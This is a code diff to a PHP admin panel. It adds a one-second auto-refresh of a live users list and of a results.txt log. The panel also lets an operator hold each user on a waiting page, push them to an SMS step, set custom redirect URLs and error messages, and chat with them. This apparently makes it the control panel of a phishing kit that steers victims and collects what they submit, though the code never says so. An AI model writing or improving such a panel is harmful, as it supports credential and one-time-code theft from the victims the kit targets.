@@ -107,6 +107,19 @@ if ($isAdmin && isset($_POST['ajax']) && $_POST['ajax'] === 'toggle_chat') {
     exit;
 }
 
+if ($isAdmin && isset($_GET['ajax']) && $_GET['ajax'] === 'dashboard_snapshot') {
+    $users = panelReadUsers();
+    $resultsContent = file_exists($resultsFile) ? file_get_contents($resultsFile) : '';
+
+    header('Content-Type: application/json');
+    echo json_encode([
+        'success' => true,
+        'users' => array_values($users),
+        'results' => $resultsContent,
+    ]);
+    exit;
+}
+
 $currentState = $selectedUserId !== '' ? panelLoadState($selectedUserId) : panelDefaults();
 $currentRoute = $currentState['instruction'] === 'stay_wait' ? 'waiting' : 'sms';
 $currentSmsAction = 'nothing';
@@ -145,14 +158,16 @@ $resultsContent = file_exists($resultsFile) ? file_get_contents($resultsFile) : 
     <div class="grid">
         <div class="card users">
             <h3>Users</h3>
-            <?php if (empty($users)): ?><div class="meta">No users yet.</div><?php endif; ?>
-            <?php foreach ($users as $user): ?>
-                <a href="?user=<?php echo urlencode($user['id']); ?>" class="<?php echo $selectedUserId === $user['id'] ? 'active' : ''; ?>">
-                    <strong><?php echo htmlspecialchars($user['name'] ?: 'Unknown'); ?></strong><br>
-                    <span class="meta">ID: <?php echo htmlspecialchars($user['id']); ?></span><br>
-                    <span class="meta">Page: <?php echo htmlspecialchars($user['page']); ?></span>
-                </a>
-            <?php endforeach; ?>
+            <div id="users-list">
+                <?php if (empty($users)): ?><div class="meta">No users yet.</div><?php endif; ?>
+                <?php foreach ($users as $user): ?>
+                    <a href="?user=<?php echo urlencode($user['id']); ?>" class="<?php echo $selectedUserId === $user['id'] ? 'active' : ''; ?>">
+                        <strong><?php echo htmlspecialchars($user['name'] ?: 'Unknown'); ?></strong><br>
+                        <span class="meta">ID: <?php echo htmlspecialchars($user['id']); ?></span><br>
+                        <span class="meta">Page: <?php echo htmlspecialchars($user['page']); ?></span>
+                    </a>
+                <?php endforeach; ?>
+            </div>
         </div>
         <div>
             <div class="card control-card">
@@ -187,7 +202,7 @@ $resultsContent = file_exists($resultsFile) ? file_get_contents($resultsFile) : 
                 <div class="meta" style="margin-bottom:10px">Each online user has an independent chat box and its own enable chat switch.</div>
                 <div id="multi-chat-container"></div>
             </div>
-            <div class="card" style="margin-top:12px"><h3>results.txt</h3><pre style="white-space:pre-wrap"><?php echo htmlspecialchars($resultsContent); ?></pre></div>
+            <div class="card" style="margin-top:12px"><h3>results.txt</h3><pre id="results-content" style="white-space:pre-wrap"><?php echo htmlspecialchars($resultsContent); ?></pre></div>
         </div>
     </div>
 </div>
@@ -208,6 +223,8 @@ const instructionField = document.getElementById('instruction');
 const customUrlRow = document.getElementById('custom-url-row');
 const customErrorRow = document.getElementById('custom-error-row');
 const customUrlField = document.getElementById('custom_url');
+const usersList = document.getElementById('users-list');
+const resultsContent = document.getElementById('results-content');
 
 function escapeHtml(value){
     return String(value || '').replace(/[&<>"']/g, (ch) => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#039;'}[ch]));
@@ -298,6 +315,22 @@ function renderChatCard(user){
             selectUser(user.id);
         });
     }
+}
+
+function renderUsersList(users){
+    if (!usersList) return;
+    if (!users.length) {
+        usersList.innerHTML = '<div class="meta">No users yet.</div>';
+        return;
+    }
+
+    usersList.innerHTML = users.map((user) => `
+        <a href="?user=${encodeURIComponent(user.id)}" class="${selectedUserId === user.id ? 'active' : ''}">
+            <strong>${escapeHtml(user.name || 'Unknown')}</strong><br>
+            <span class="meta">ID: ${escapeHtml(user.id)}</span><br>
+            <span class="meta">Page: ${escapeHtml(user.page || '')}</span>
+        </a>
+    `).join('');
 }
 
 function selectUser(userId){
@@ -398,6 +431,32 @@ async function fetchAllChats(){
     }
 }
 
+async function refreshDashboardSnapshot(){
+    try {
+        const response = await fetch('admin.php?ajax=dashboard_snapshot');
+        const data = await response.json();
+        if (!response.ok || !data.success) {
+            return;
+        }
+
+        if (Array.isArray(data.users)) {
+            allUsers.length = 0;
+            data.users.forEach((user) => allUsers.push(user));
+            renderUsersList(allUsers);
+            allUsers.forEach((user) => renderChatCard(user));
+            if (selectedUserId) {
+                selectUser(selectedUserId);
+            }
+        }
+
+        if (resultsContent) {
+            resultsContent.textContent = data.results || '';
+        }
+    } catch (error) {
+        console.error('Unable to refresh dashboard snapshot', error);
+    }
+}
+
 async function sendChat(userId){
     const card = document.getElementById(chatCardId(userId));
     if (!card) return;
@@ -424,6 +483,8 @@ if (multiChatContainer) {
     fetchAllChats();
     setInterval(fetchAllChats, 1000);
 }
+refreshDashboardSnapshot();
+setInterval(refreshDashboardSnapshot, 1000);
 if(controlRoute){controlRoute.addEventListener('change',syncControlState);} if(smsAction){smsAction.addEventListener('change',syncControlState);} syncControlState();
 if(smsForm){smsForm.addEventListener('submit',async(e)=>{e.preventDefault();syncControlState();const formData=new FormData(smsForm);formData.append('ajax','update_sms');const res=await fetch('admin.php',{method:'POST',body:formData});const data=await res.json();flashMessage.style.display='block';flashMessage.classList.toggle('error',!data.success);flashMessage.textContent=data.message||'Update failed.';if (selectedUserId) {fetchChatForUser(selectedUserId);} if (data.state && selectedUserId) {setChatEnabled(selectedUserId, !!data.state.chat_enabled);} });}
 </script>
